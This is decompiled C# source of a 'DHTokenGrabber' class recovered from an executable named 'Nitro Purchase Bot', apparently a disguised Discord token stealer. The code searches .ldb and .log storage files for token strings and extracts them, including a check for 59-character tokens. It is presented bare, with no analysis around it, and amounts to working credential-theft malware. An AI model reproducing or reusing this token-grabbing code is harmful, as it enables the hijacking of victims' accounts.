// Decompiled with JetBrains decompiler
// Type: DHTokenGrabber.Grabber
// Assembly: DHTokenGrabber, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DA47AD1B-F275-4D29-9279-8EA7ACDC786C
// Assembly location: C:\Users\lukumiya\Desktop\Nitro Purchase Bot\Nitro Purchase Bot\[Nitro Purchase Bot].exe

using System.Collections.Generic;
using System.IO;
using System.Text;

namespace DHTokenGrabber
{
  internal class Grabber
  {
    public static bool FindLdb(ref string path)
    {
      if (!Directory.Exists(path))
        return false;
      foreach (FileInfo file in new DirectoryInfo(path).GetFiles())
      {
        if (file.Name.EndsWith(".ldb") && File.ReadAllText(file.FullName).Contains("oken"))
        {
          path += file.Name;
          break;
        }
      }
      return path.EndsWith(".ldb");
    }

    public static bool FindLog(ref string path)
    {
      if (!Directory.Exists(path))
        return false;
      foreach (FileInfo file in new DirectoryInfo(path).GetFiles())
      {
        if (file.Name.EndsWith(".log") && File.ReadAllText(file.FullName).Contains("oken"))
        {
          path += file.Name;
          break;
        }
      }
      return path.EndsWith(".log");
    }

    public static string GetToken(string path, bool isLog = false)
    {
      string str1 = Encoding.UTF8.GetString(File.ReadAllBytes(path));
      string str2 = "";
      string contents = str1;
      while (contents.Contains("oken"))
      {
        string[] strArray = Grabber.Sub(contents).Split('"');
        str2 = strArray[0];
        contents = string.Join("\"", strArray);
        if (isLog && str2.Length == 59)
          break;
      }
      return str2;
    }

    private static string Sub(string contents)
    {
      string[] strArray = contents.Substring(contents.IndexOf("oken") + 4).Split('"');
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) strArray);
      stringList.RemoveAt(0);
      return string.Join("\"", stringList.ToArray());
    }
  }
}
